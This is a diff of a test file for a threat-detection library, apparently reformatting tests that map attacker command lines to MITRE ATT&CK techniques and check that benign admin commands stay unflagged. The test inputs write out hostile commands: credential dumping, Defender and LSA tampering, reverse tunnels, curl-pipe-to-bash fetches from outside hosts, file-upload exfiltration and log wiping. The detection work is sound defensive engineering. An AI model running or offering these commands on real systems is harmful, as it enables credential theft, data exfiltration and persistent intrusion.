@@ -28,10 +28,14 @@ describe("tradecraftRules — strong (High) attacker tradecraft", () => {
   });
 
   it("flags LSA / UAC policy tampering with the right technique", () => {
-    expect(sig("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f")?.mitre).toContain("T1562.001");
+    expect(
+      sig("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f")?.mitre,
+    ).toContain("T1562.001");
     expect(sig("reg add ...WDigest /v UseLogonCredential /t REG_DWORD /d 1")?.mitre).toContain("T1003.001");
     expect(sig("reg add ...System /v EnableLUA /t REG_DWORD /d 0 /f")?.mitre).toContain("T1548.002");
-    expect(sig("reg add hkcu\\software\\classes\\ms-settings\\shell\\open\\command")?.mitre).toContain("T1548.002");
+    expect(sig("reg add hkcu\\software\\classes\\ms-settings\\shell\\open\\command")?.mitre).toContain(
+      "T1548.002",
+    );
   });
 
   it("flags credential dumping beyond isSuspiciousCmd's coverage", () => {
@@ -41,9 +45,14 @@ describe("tradecraftRules — strong (High) attacker tradecraft", () => {
     expect(sig("nxc smb 10.0.0.1 -u u -p p -M lsassy")?.mitre).toContain("T1003");
     expect(sig("reg.exe save hklm\\security c:\\ProgramData\\security.save")?.mitre).toContain("T1003.002");
     expect(sig("reg.exe save hklm\\system c:\\ProgramData\\system.save")?.mitre).toContain("T1003.002");
-    expect(sig('psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password FROM credentials"')?.mitre).toContain("T1555");
+    expect(
+      sig('psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password FROM credentials"')
+        ?.mitre,
+    ).toContain("T1555");
     expect(sig("Rubeus.exe kerberoast")?.mitre).toContain("T1558.003");
-    expect(sig('New-MailboxExportRequest -Mailbox "admin" -FilePath "\\\\srv\\c$\\x.aspx"')?.mitre).toContain("T1114.002");
+    expect(sig('New-MailboxExportRequest -Mailbox "admin" -FilePath "\\\\srv\\c$\\x.aspx"')?.mitre).toContain(
+      "T1114.002",
+    );
     expect(sig("lazagne.exe all")?.mitre).toContain("T1555");
   });
 
@@ -72,16 +81,24 @@ describe("tradecraftRules — strong (High) attacker tradecraft", () => {
 
   it("flags tunneling, Impacket lateral movement and cloud exfil", () => {
     expect(sig("ssh root@193.242.184.150 -R *:10400 -p22")?.mitre).toContain("T1572");
-    expect(sig("plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 1.2.3.4 -P 22 -no-antispoof")?.mitre).toContain("T1572");
+    expect(
+      sig("plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 1.2.3.4 -P 22 -no-antispoof")?.mitre,
+    ).toContain("T1572");
     expect(sig("ssh -N -D 1080 user@host")?.mitre).toContain("T1090");
     expect(sig("wmic /node:10.0.0.5 process call create 'cmd.exe /c x.bat'")?.mitre).toContain("T1047");
     expect(sig("cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1700000000 2>&1")?.mitre).toContain("T1047");
-    expect(sig('rclone.exe copy "\\\\SRV\\Shares" mega:DATA -q --ignore-existing')?.mitre).toContain("T1567.002");
+    expect(sig('rclone.exe copy "\\\\SRV\\Shares" mega:DATA -q --ignore-existing')?.mitre).toContain(
+      "T1567.002",
+    );
     expect(sig("restic.exe -r rest:http://1.2.3.4:8000/ backup C:\\data")?.mitre).toContain("T1567.002");
   });
 
   it("flags web-client file upload as exfiltration (T1041) but not a plain download", () => {
-    expect(sig("powershell.exe -nop -w hidden -c Invoke-RestMethod -Uri https://mft.brightparcel.io/u/inbox -Method Put -InFile C:\\Windows\\Temp\\rb.zip")?.mitre).toContain("T1041");
+    expect(
+      sig(
+        "powershell.exe -nop -w hidden -c Invoke-RestMethod -Uri https://mft.brightparcel.io/u/inbox -Method Put -InFile C:\\Windows\\Temp\\rb.zip",
+      )?.mitre,
+    ).toContain("T1041");
     expect(sig("iwr -Uri https://x.tld/api -Method Post -Body $json")?.mitre).toContain("T1041");
     expect(sig("curl -T loot.zip https://x.tld/upload")?.mitre).toContain("T1041");
     // plain download / GET must NOT be graded as exfil
@@ -91,20 +108,32 @@ describe("tradecraftRules — strong (High) attacker tradecraft", () => {
 
   it("flags ANY robocopy/xcopy invocation as strong T1074.001, even routine-looking backup usage", () => {
     // The real halcyon-insider-usb exfil staging — must be strong.
-    expect(sig("Robocopy.exe \\\\FS-01\\Engineering\\Projects\\TX-940 C:\\Windows\\Temp\\dfsr_stage\\TX-940 /E /Z /R:1 /W:1 /NP")?.weight).toBe("strong");
-    expect(sig("xcopy.exe C:\\Windows\\Temp\\dfsr_stage\\q2_rollup.7z E:\\ /Y")?.mitre).toContain("T1074.001");
+    expect(
+      sig(
+        "Robocopy.exe \\\\FS-01\\Engineering\\Projects\\TX-940 C:\\Windows\\Temp\\dfsr_stage\\TX-940 /E /Z /R:1 /W:1 /NP",
+      )?.weight,
+    ).toBe("strong");
+    expect(sig("xcopy.exe C:\\Windows\\Temp\\dfsr_stage\\q2_rollup.7z E:\\ /Y")?.mitre).toContain(
+      "T1074.001",
+    );
     // A routine-looking SYSTEM/admin backup job — deliberately ALSO strong (no argument distinguishes
     // it from theft); the analyst is expected to suppress recurring legitimate use via false-positive
     // marking + "mark similar" instead of the rule guessing intent from arguments.
-    expect(sig("Robocopy.exe D:\\Shares\\Engineering D:\\VeeamRepo\\Engineering /MIR /R:1 /W:1")?.weight).toBe("strong");
-    expect(sig('xcopy.exe "C:\\Users\\helen.osei\\Documents\\Board\\Q2-Review.pptx" E:\\ /Y')?.mitre).toContain("T1074.001");
+    expect(
+      sig("Robocopy.exe D:\\Shares\\Engineering D:\\VeeamRepo\\Engineering /MIR /R:1 /W:1")?.weight,
+    ).toBe("strong");
+    expect(
+      sig('xcopy.exe "C:\\Users\\helen.osei\\Documents\\Board\\Q2-Review.pptx" E:\\ /Y')?.mitre,
+    ).toContain("T1074.001");
     // Bare image name alone (no arguments) still flags.
     expect(sig("", "C:\\Windows\\System32\\Robocopy.exe")?.weight).toBe("strong");
     expect(sig("C:\\Windows\\System32\\xcopy.exe", "")?.weight).toBe("strong");
   });
 
   it("flags AnyDesk/RustDesk unattended setup as strong, bare presence as weak", () => {
-    expect(sig("anydesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent")?.weight).toBe("strong");
+    expect(sig("anydesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent")?.weight).toBe(
+      "strong",
+    );
     expect(sig("echo pw | anydesk.exe --set-password")?.weight).toBe("strong");
     const bare = sig("C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe");
     expect(bare?.weight).toBe("weak");
@@ -114,30 +143,54 @@ describe("tradecraftRules — strong (High) attacker tradecraft", () => {
 
 describe("tradecraftRules — Huntress Rapid Response corpus additions", () => {
   it("flags registry-based Defender/firewall service disable (Start=4), distinct from net/sc stop", () => {
-    expect(sig('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\mpssvc" /v Start /t REG_DWORD /d 4 /f')?.mitre).toContain("T1562.001");
-    expect(sig("SystemSettingsAdminFlows.exe Defender DisableEnhancedNotifications 1")?.mitre).toContain("T1562.001");
+    expect(
+      sig('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\mpssvc" /v Start /t REG_DWORD /d 4 /f')?.mitre,
+    ).toContain("T1562.001");
+    expect(sig("SystemSettingsAdminFlows.exe Defender DisableEnhancedNotifications 1")?.mitre).toContain(
+      "T1562.001",
+    );
   });
 
   it("flags msiexec remote silent install and curl|bash fetch-execute", () => {
     const r = sig("cmd.exe /c msiexec /q /i http://4.216.93.211:5981/RuntimeBroker.msi");
     expect(r?.weight).toBe("strong");
     expect(r?.mitre).toEqual(expect.arrayContaining(["T1105", "T1218.007"]));
-    expect(sig("curl -s hxxp://keep.camdvr.org:8000/d5.sh | bash")?.mitre).toEqual(expect.arrayContaining(["T1105", "T1059.004"]));
+    expect(sig("curl -s hxxp://keep.camdvr.org:8000/d5.sh | bash")?.mitre).toEqual(
+      expect.arrayContaining(["T1105", "T1059.004"]),
+    );
     expect(sig("wget -qO- http://x.tld/i.sh | sudo sh")?.mitre).toContain("T1105");
   });
 
   it("flags NTDS.dit exfil via wbadmin backup and manual browser-credential-file copy", () => {
-    expect(sig("wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:C:\\windows\\NTDS\\ntds.dit -quiet")?.mitre).toContain("T1003.003");
-    expect(sig('copy "C:\\Users\\bob\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" C:\\Windows\\Temp\\')?.mitre).toContain("T1555.003");
+    expect(
+      sig(
+        "wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:C:\\windows\\NTDS\\ntds.dit -quiet",
+      )?.mitre,
+    ).toContain("T1003.003");
+    expect(
+      sig(
+        'copy "C:\\Users\\bob\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" C:\\Windows\\Temp\\',
+      )?.mitre,
+    ).toContain("T1555.003");
   });
 
   it("flags persistence: malicious sc-created service, hidden account, privileged-group add, chattr +i, bulk EventLog wipe", () => {
-    expect(sig('sc create windowDefenSrv binPath= "c:\\users\\public\\86.dat windowDefenSrv" start= auto')?.mitre).toContain("T1543.003");
-    expect(sig('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v backup_da /d 0 /f')?.mitre).toContain("T1564.002");
+    expect(
+      sig('sc create windowDefenSrv binPath= "c:\\users\\public\\86.dat windowDefenSrv" start= auto')?.mitre,
+    ).toContain("T1543.003");
+    expect(
+      sig(
+        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v backup_da /d 0 /f',
+      )?.mitre,
+    ).toContain("T1564.002");
     expect(sig('net group "Domain Admins" azuresync /add')?.mitre).toContain("T1098.007");
-    expect(sig('net localgroup Administrators evilacct /add')?.mitre).toContain("T1098.007");
+    expect(sig("net localgroup Administrators evilacct /add")?.mitre).toContain("T1098.007");
     expect(sig("chattr +i /usr/bin/sshd-agent")?.mitre).toContain("T1222.002");
-    expect(sig('powershell.exe [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)')?.mitre).toContain("T1070.001");
+    expect(
+      sig(
+        "powershell.exe [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)",
+      )?.mitre,
+    ).toContain("T1070.001");
   });
 
   it("flags the QEMU SSH-backdoor persistence/tunnel primitive", () => {
@@ -152,7 +205,11 @@ describe("tradecraftRules — Huntress Rapid Response corpus additions", () => {
   });
 
   it("flags Elastic-Cloud-ingest exfil and InternetExplorer.Application COM proxy execution", () => {
-    expect(sig("Invoke-RestMethod -Uri https://my-deployment.es.us-east-1.aws.elastic-cloud.com:9243/_bulk -Method Post -Body $data")?.mitre).toContain("T1041");
+    expect(
+      sig(
+        "Invoke-RestMethod -Uri https://my-deployment.es.us-east-1.aws.elastic-cloud.com:9243/_bulk -Method Post -Body $data",
+      )?.mitre,
+    ).toContain("T1041");
     expect(sig('$ie = New-Object -ComObject "InternetExplorer.Application"')?.mitre).toContain("T1559.001");
   });
 
@@ -178,24 +235,24 @@ describe("tradecraftRules — false-positive guards (must NOT flag benign admin 
       "ipconfig /all",
       "net stop spooler",
       "net stop wuauserv",
-      "ssh admin@jumpbox",                       // plain SSH login, no -R/-D
+      "ssh admin@jumpbox", // plain SSH login, no -R/-D
       "scp file.txt user@host:/tmp/",
       "C:\\Program Files\\PostgreSQL\\15\\bin\\psql.exe -U app -d appdb -c 'SELECT * FROM orders'",
-      "rclone version",                          // no copy/sync/remote
-      "reg save HKLM\\SOFTWARE backup.hiv",       // SOFTWARE hive, not SAM/SECURITY/SYSTEM
-      "powershell Get-MpComputerStatus",          // AV status read (discovery, not disable)
-      "wbadmin start backup -backuptarget:E:",    // legitimate backup
-      "sc query WinDefend",                       // status query, not stop/config
+      "rclone version", // no copy/sync/remote
+      "reg save HKLM\\SOFTWARE backup.hiv", // SOFTWARE hive, not SAM/SECURITY/SYSTEM
+      "powershell Get-MpComputerStatus", // AV status read (discovery, not disable)
+      "wbadmin start backup -backuptarget:E:", // legitimate backup
+      "sc query WinDefend", // status query, not stop/config
       "bcdedit /enum",
       "tar -czf backup.tgz /data",
-      "msiexec /i C:\\Installers\\app.msi /qn",          // local install, no remote URL
-      "curl -s https://example.com/README.md",           // plain fetch, no pipe-to-shell
-      "sc create MyLegitSvc binPath= \"C:\\Program Files\\App\\svc.exe\"", // not staged in a user-writable dir
-      "net localgroup Backup-Operators bob /add",        // not a privileged group
+      "msiexec /i C:\\Installers\\app.msi /qn", // local install, no remote URL
+      "curl -s https://example.com/README.md", // plain fetch, no pipe-to-shell
+      'sc create MyLegitSvc binPath= "C:\\Program Files\\App\\svc.exe"', // not staged in a user-writable dir
+      "net localgroup Backup-Operators bob /add", // not a privileged group
       "reg add HKLM\\SOFTWARE\\Contoso\\App /v Setting /d 1 /f",
-      "chmod 750 /usr/bin/sshd-agent",                    // permission change, not immutable flag
-      "Get-WinEvent -LogName Security -MaxEvents 10",     // reading logs, not clearing them
-      "qemu-system-x86_64.exe -m 2048 -hda disk.img",     // normal VM boot, no hostfwd backdoor
+      "chmod 750 /usr/bin/sshd-agent", // permission change, not immutable flag
+      "Get-WinEvent -LogName Security -MaxEvents 10", // reading logs, not clearing them
+      "qemu-system-x86_64.exe -m 2048 -hda disk.img", // normal VM boot, no hostfwd backdoor
       "Invoke-RestMethod -Uri https://api.contoso.com/status", // plain API GET, not upload/exfil
     ]) {
       expect(sig(cmd), cmd).toBeNull();
@@ -206,10 +263,17 @@ describe("tradecraftRules — false-positive guards (must NOT flag benign admin 
 describe("reconTechniques — new discovery patterns from the corpus", () => {
   it("tags domain-trust, AD-recon tooling, scanners, AV and share discovery", () => {
     expect(reconTechniques("nltest.exe", "nltest /domain_trusts /all_trusts")).toContain("T1482");
-    expect(reconTechniques("af.exe", "af.exe -gcb -sc trustdmp")).toEqual(expect.arrayContaining(["T1482", "T1087.002"]));
+    expect(reconTechniques("af.exe", "af.exe -gcb -sc trustdmp")).toEqual(
+      expect.arrayContaining(["T1482", "T1087.002"]),
+    );
     expect(reconTechniques("sharphound.exe", "sharphound.exe -c all")).toContain("T1087.002");
     expect(reconTechniques("netscan.exe", "netscan.exe /range")).toContain("T1046");
-    expect(reconTechniques("wmic.exe", "WMIC /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName")).toContain("T1518.001");
+    expect(
+      reconTechniques(
+        "wmic.exe",
+        "WMIC /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName",
+      ),
+    ).toContain("T1518.001");
     expect(reconTechniques("powershell.exe", "Invoke-ShareFinder -CheckShareAccess")).toContain("T1135");
   });
 });
@@ -320,7 +384,7 @@ describe("tradecraftRules — Linux/Unix attacker tradecraft", () => {
       "id",
       "hostname -f",
       "systemctl status nginx",
-      "gzip /var/log/nginx/access.log.1",          // log rotation, not staging
+      "gzip /var/log/nginx/access.log.1", // log rotation, not staging
       "tar czf /backups/etc-$(date +%F).tar.gz /etc",
       "cat /etc/hostname",
       "vim /opt/app/config.yaml",
@@ -328,8 +392,8 @@ describe("tradecraftRules — Linux/Unix attacker tradecraft", () => {
       // staging, so a home-dir SOURCE must stay quiet or every nightly backup becomes a finding.
       "tar czf /backups/home-nightly.tgz /home/dana",
       "rsync -a /home/dana/ /mnt/backup/dana/",
-      "rm -rf /home/dana/project/node_modules",    // ordinary dev cleanup, no archive/dump artifact
-      "rm -f /var/log/syslog.1.gz",                // log rotation, not staged-archive cleanup
+      "rm -rf /home/dana/project/node_modules", // ordinary dev cleanup, no archive/dump artifact
+      "rm -f /var/log/syslog.1.gz", // log rotation, not staged-archive cleanup
     ]) {
       expect(sig(cmd), cmd).toBeNull();
     }
